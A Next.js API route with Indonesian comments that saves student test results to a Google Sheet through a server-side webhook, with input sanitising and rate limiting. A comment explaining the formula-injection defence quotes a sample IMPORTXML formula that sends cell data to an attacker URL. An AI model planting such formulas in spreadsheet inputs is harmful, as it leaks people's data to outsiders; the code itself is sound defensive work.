import { NextResponse } from 'next/server'
import { rateLimit, getClientIp } from '../../lib/rateLimit'

// Webhook Apps Script & token disimpan di server (env var Vercel),
// tidak pernah dikirim ke browser.
const SHEET_WEBHOOK_URL = process.env.SHEET_WEBHOOK_URL
const SHEET_WEBHOOK_TOKEN       = process.env.SHEET_WEBHOOK_TOKEN

const MAX_TEXT = 80

// Karakter pembuka yang membuat Google Sheets memperlakukan isi sel sebagai
// RUMUS, bukan teks. Tanpa penetralan, isian seperti
//   =IMPORTXML("https://penyerang/?d="&B2)
// akan dieksekusi saat Sheet dibuka dan bisa mengirim isi sel ke luar.
const AWALAN_RUMUS = /^[=+\-@]/

function bersih(s) {
  let v = String(s ?? '').replace(/[\r\n\t]+/g, ' ').trim().slice(0, MAX_TEXT)
  // Apostrof di depan memaksa Sheets membaca sebagai teks; apostrofnya sendiri
  // tidak ikut tampil, jadi datanya tetap terbaca apa adanya saat dianalisis.
  if (AWALAN_RUMUS.test(v)) v = "'" + v
  return v
}

// NIM dipakai sebagai KUNCI (dedupe & pencarian skor pra-tes), jadi tidak boleh
// diberi apostrof — cukup dibatasi ke karakter yang aman saja.
function bersihNim(s) {
  return String(s ?? '').trim().replace(/[^A-Za-z0-9._-]/g, '').slice(0, 30)
}

export async function POST(request) {
  // ── Lapis 1: batas kasar per-IP, sekadar penjaga penyalahgunaan ──
  // Dibuat longgar karena SATU KELAS di WiFi kampus tampak sebagai satu IP.
  // Batas ketat per-mahasiswa dilakukan di lapis 2 (berdasarkan NIM).
  const ip = getClientIp(request)
  const rlIp = rateLimit(`simpan-hasil-ip:${ip}`, { limit: 120, windowMs: 60_000 })
  if (!rlIp.ok) {
    return NextResponse.json({ status: 'error', error: 'Terlalu banyak permintaan dari jaringan ini. Tunggu sebentar lalu coba lagi.' }, { status: 429 })
  }

  if (!SHEET_WEBHOOK_URL || !SHEET_WEBHOOK_TOKEN) {
    return NextResponse.json({ status: 'error', error: 'Penyimpanan hasil belum dikonfigurasi (env SHEET_WEBHOOK_URL/SHEET_WEBHOOK_TOKEN).' }, { status: 503 })
  }

  let body
  try { body = await request.json() } catch {
    return NextResponse.json({ status: 'error', error: 'Body tidak valid' }, { status: 400 })
  }

  // ── Validasi input ──
  const nim   = bersihNim(body.nim)
  const nama  = bersih(body.nama)
  const kelas = bersih(body.kelas)
  const form  = body.form === 'pre' || body.form === 'post' ? body.form : null
  const skor  = Number(body.skor)
  const maks  = Number(body.maks)
  const perDim = body.perDim && typeof body.perDim === 'object' ? body.perDim : {}

  if (!nim || !nama || !form) {
    return NextResponse.json({ status: 'error', error: 'Nama, NIM, dan jenis tes wajib diisi.' }, { status: 400 })
  }
  if (!Number.isInteger(skor) || skor < 0 || skor > 25 || maks !== 25) {
    return NextResponse.json({ status: 'error', error: 'Skor tidak valid.' }, { status: 400 })
  }

  // ── Lapis 2: batas ketat per-MAHASISWA ──
  // Inilah pembatas yang sebenarnya. Satu mahasiswa wajar mengirim beberapa kali
  // (mis. percobaan ulang otomatis saat jaringan tersendat), tetapi tidak puluhan.
  // Dengan kunci NIM, satu kelas tidak lagi saling menghabiskan jatah.
  const rlNim = rateLimit(`simpan-hasil-nim:${nim}:${form}`, { limit: 6, windowMs: 60_000 })
  if (!rlNim.ok) {
    return NextResponse.json({ status: 'error', error: 'Terlalu banyak percobaan untuk NIM ini. Tunggu sebentar.' }, { status: 429 })
  }

  const payload = {
    token: SHEET_WEBHOOK_TOKEN,
    nim, nama, kelas, form, skor, maks,
    ail1: Number(perDim.AIL1) || 0,
    ail2: Number(perDim.AIL2) || 0,
    ail3: Number(perDim.AIL3) || 0,
    ail4: Number(perDim.AIL4) || 0,
    // Dibatasi panjangnya supaya tidak ada sel raksasa yang masuk ke Sheet
    jawaban: JSON.stringify(Array.isArray(body.jawaban) ? body.jawaban.slice(0, 25) : []).slice(0, 2000),
  }

  try {
    const res = await fetch(SHEET_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      // Sengaja 9 detik, DI BAWAH batas durasi fungsi Vercel (Hobby ±10 detik).
      // Kalau lebih lama, Vercel yang memutus lebih dulu dan pesan gagalnya jadi
      // menyesatkan. Dengan 9 detik, kegagalan dilaporkan jujur dan sisi klien
      // masih sempat mencoba ulang.
      signal: AbortSignal.timeout(9_000),
    })
    const text = await res.text()
    let data
    try { data = JSON.parse(text) } catch { data = { status: 'ok' } }
    return NextResponse.json(data)
  } catch (err) {
    console.error('simpan-hasil error:', err.message)
    return NextResponse.json({ status: 'error', error: 'Gagal menyimpan hasil, coba lagi.' }, { status: 502 })
  }
}
